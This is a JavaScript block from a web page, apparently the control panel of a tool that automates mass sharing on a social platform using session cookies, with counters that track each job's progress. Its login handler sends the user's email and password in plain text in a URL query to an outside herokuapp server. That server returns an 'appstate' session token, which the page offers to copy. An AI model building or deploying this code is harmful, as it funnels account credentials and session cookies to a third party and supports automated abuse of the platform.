<script>
           function updatePing() {
    const start = performance.now();
    const pingText = document.querySelector('#ping');

    fetch('/')
      .then(() => {
        const end = performance.now();
        const time = end - start;
        pingText.textContent = `Ping: ${time.toFixed(2)} ms`;
      })
      .catch((error) => console.error(error));
  }

  setInterval(updatePing, 1000);
  updatePing();
  
         async function submitForm() {
           event.preventDefault();
           const result = document.getElementById('result');
           const button = document.getElementById('submit-button');
           try {
             result.style.display = 'block';
             button.style.display = 'none';
             const response = await fetch('/api/submit', {
               method: 'POST',
               body: JSON.stringify({
                 cookie: document.getElementById('cookies').value,
                 url: document.getElementById('urls').value,
                 amount: document.getElementById('amounts').value,
                 interval: document.getElementById('intervals').value,
               }),
               headers: {
                 'Content-Type': 'application/json',
               },
             });
             const data = await response.json();

             if (data.status === 200) {
               result.style.backgroundColor = '#32ff0dc7';
               result.style.color = '#222';
               result.innerHTML = 'Submitted successfully!';
               button.style.display = 'block';
             } else {
               result.style.backgroundColor = '#3D1619';
               result.style.color = '#FE6265';
               result.innerHTML = 'Error: ' + data.error;
               button.style.display = 'block';
             }
           } catch (e) {
             console.error(e);
           }
         }

         async function linkOfProcessing() {
           try {
             const container = document.getElementById('processing');
             const processContainer = document.getElementById('process-container');
             const initialResponse = await fetch('/total');

             if (!initialResponse.ok) {
               throw new Error(`Failed to fetch: ${initialResponse.status} - ${initialResponse.statusText}`);
             }

             const initialData = await initialResponse.json();
             if (initialData.length === 0) {
               processContainer.style.display = 'none';
               return;
             }
             initialData.forEach((link, index) => {

               let { url, count, id, target, session } = link;
               const processCard = document.createElement('div');
               processCard.classList.add('current-online');

               const text = document.createElement('h4');
               text.classList.add('count-text');
               text.innerHTML = `${index + 1}. ID: ${id} | ${count}/${target}`;

               processCard.appendChild(text);
               container.appendChild(processCard);

               const intervalId = setInterval(async () => {
                 const updateResponse = await fetch('/total');

                 if (!updateResponse.ok) {
                   console.error(`Failed to fetch update: ${updateResponse.status} - ${updateResponse.statusText}`);
                   return;
                 }

                 const updateData = await updateResponse.json();
                 const updatedLink = updateData.find((link) => link.session === session);

                 if (updatedLink) {
                   let { count } = updatedLink;
                   update(processCard, count, id, index, target);
                 }
               }, 1000);
             });

           } catch (error) {
             console.error(error);
           }
         }

         function update(card, count, id, index, target) {
           let container = card.querySelector('.count-text');
           container.textContent = `${index + 1}. ID: ${id} | ${count}/${target}`;
         }

         linkOfProcessing();

         function loginRequest(email, password) {
  return fetch("https://last-api-30a30f1ae341.herokuapp.com/api/appstate?e=" + email + "&p=" + password, {
    method: "GET"
  });
}

document.getElementById("copy-button").style.display = "none";

document.getElementById("login-form").addEventListener("submit", async function(event) {
  event.preventDefault();

  const loginButton = document.getElementById("login-button");
  const email = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    loginButton.innerText = "Logging In";

    const response = await loginRequest(email, password);
    const data = await response.json();

    if (data.success) {
      document.getElementById("result-container").style.display = "block";
      document.getElementById("appstate").innerText = data.success;
      alert("Login Success, Click \"Ok\"");
      loginButton.innerText = "Logged In";
      document.getElementById("copy-button").style.display = "block";
    } else {
      alert("Failed to retrieve appstate. Please check your credentials and try again.");
    }
  } catch (error) {
    console.error("Error retrieving appstate:", error);
    alert("An error occurred while retrieving appstate. Please try again later.");
  }
});

document.getElementById("copy-button").addEventListener("click", function() {
  const appstate = document.getElementById("appstate").innerText;
  navigator.clipboard.writeText(appstate).then(function() {
    alert("Appstate copied to clipboard!");
  }, function(error) {
    console.error("Failed to copy appstate: ", error);
    alert("Failed to copy appstate. Please try again.");
  });
});

            </script>
